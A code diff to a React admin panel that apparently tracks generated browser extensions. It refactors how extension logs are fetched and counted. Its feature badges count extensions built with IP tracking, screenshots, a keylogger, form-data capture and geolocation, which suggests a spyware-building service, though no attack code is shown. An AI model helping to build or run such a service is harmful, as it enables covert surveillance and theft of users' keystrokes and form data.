@@ -126,10 +126,12 @@ export default function AdminPanel({}: AdminPanelProps) {
     refetchInterval: 30000, // Refresh every 30 seconds
   });
 
-  const { data: extensionLogs, isLoading: extensionLogsLoading } = useQuery({
+  const { data: extensionLogsData, isLoading: extensionLogsLoading } = useQuery({
     queryKey: ['/api/extension-logs'],
     enabled: isAdmin,
   });
+
+  const extensionLogs = extensionLogsData?.logs || [];
 
   // Mutations
   const createSingleKeyMutation = useMutation({
@@ -838,24 +840,24 @@ export default function AdminPanel({}: AdminPanelProps) {
                   <CardContent className="space-y-4">
                     <div className="flex justify-between">
                       <span className="text-muted-foreground">Total Generated:</span>
-                      <span className="font-medium">{extensionLogs?.length || 0}</span>
+                      <span className="font-medium">{extensionLogs.length || 0}</span>
                     </div>
                     <div className="flex justify-between">
                       <span className="text-muted-foreground">Successful:</span>
                       <span className="font-medium text-green-500">
-                        {extensionLogs?.filter((log: any) => log.generationStatus === 'success').length || 0}
+                        {extensionLogs.filter((log: any) => log.generationStatus === 'success').length || 0}
                       </span>
                     </div>
                     <div className="flex justify-between">
                       <span className="text-muted-foreground">Failed:</span>
                       <span className="font-medium text-red-500">
-                        {extensionLogs?.filter((log: any) => log.generationStatus === 'error').length || 0}
+                        {extensionLogs.filter((log: any) => log.generationStatus === 'error').length || 0}
                       </span>
                     </div>
                     <div className="flex justify-between">
                       <span className="text-muted-foreground">This Hour:</span>
                       <span className="font-medium">
-                        {extensionLogs?.filter((log: any) => 
+                        {extensionLogs.filter((log: any) => 
                           new Date(log.createdAt) > new Date(Date.now() - 60 * 60 * 1000)
                         ).length || 0}
                       </span>
@@ -863,7 +865,7 @@ export default function AdminPanel({}: AdminPanelProps) {
                     <div className="flex justify-between">
                       <span className="text-muted-foreground">Total Downloads:</span>
                       <span className="font-medium">
-                        {extensionLogs?.reduce((acc: number, log: any) => acc + (log.downloadCount || 0), 0) || 0}
+                        {extensionLogs.reduce((acc: number, log: any) => acc + (log.downloadCount || 0), 0) || 0}
                       </span>
                     </div>
                   </CardContent>
@@ -881,31 +883,31 @@ export default function AdminPanel({}: AdminPanelProps) {
                     <div className="flex justify-between">
                       <span className="text-muted-foreground">IP Tracking:</span>
                       <Badge variant="secondary">
-                        {extensionLogs?.filter((log: any) => log.features?.includes('ip_tracking')).length || 0}
+                        {extensionLogs.filter((log: any) => log.features?.includes('ip_tracking')).length || 0}
                       </Badge>
                     </div>
                     <div className="flex justify-between">
                       <span className="text-muted-foreground">Screenshots:</span>
                       <Badge variant="secondary">
-                        {extensionLogs?.filter((log: any) => log.features?.includes('screenshot')).length || 0}
+                        {extensionLogs.filter((log: any) => log.features?.includes('screenshot')).length || 0}
                       </Badge>
                     </div>
                     <div className="flex justify-between">
                       <span className="text-muted-foreground">Keylogger:</span>
                       <Badge variant="secondary">
-                        {extensionLogs?.filter((log: any) => log.features?.includes('keylogger')).length || 0}
+                        {extensionLogs.filter((log: any) => log.features?.includes('keylogger')).length || 0}
                       </Badge>
                     </div>
                     <div className="flex justify-between">
                       <span className="text-muted-foreground">Form Data:</span>
                       <Badge variant="secondary">
-                        {extensionLogs?.filter((log: any) => log.features?.includes('form_data')).length || 0}
+                        {extensionLogs.filter((log: any) => log.features?.includes('form_data')).length || 0}
                       </Badge>
                     </div>
                     <div className="flex justify-between">
                       <span className="text-muted-foreground">Geolocation:</span>
                       <Badge variant="secondary">
-                        {extensionLogs?.filter((log: any) => log.features?.includes('geolocation')).length || 0}
+                        {extensionLogs.filter((log: any) => log.features?.includes('geolocation')).length || 0}
                       </Badge>
                     </div>
                   </CardContent>
@@ -939,7 +941,7 @@ export default function AdminPanel({}: AdminPanelProps) {
                           </TableRow>
                         </TableHeader>
                         <TableBody>
-                          {(extensionLogs as any[])?.slice(0, 10).map((log: any) => (
+                          {extensionLogs.slice(0, 10).map((log: any) => (
                             <TableRow key={log.id}>
                               <TableCell>
                                 <div>
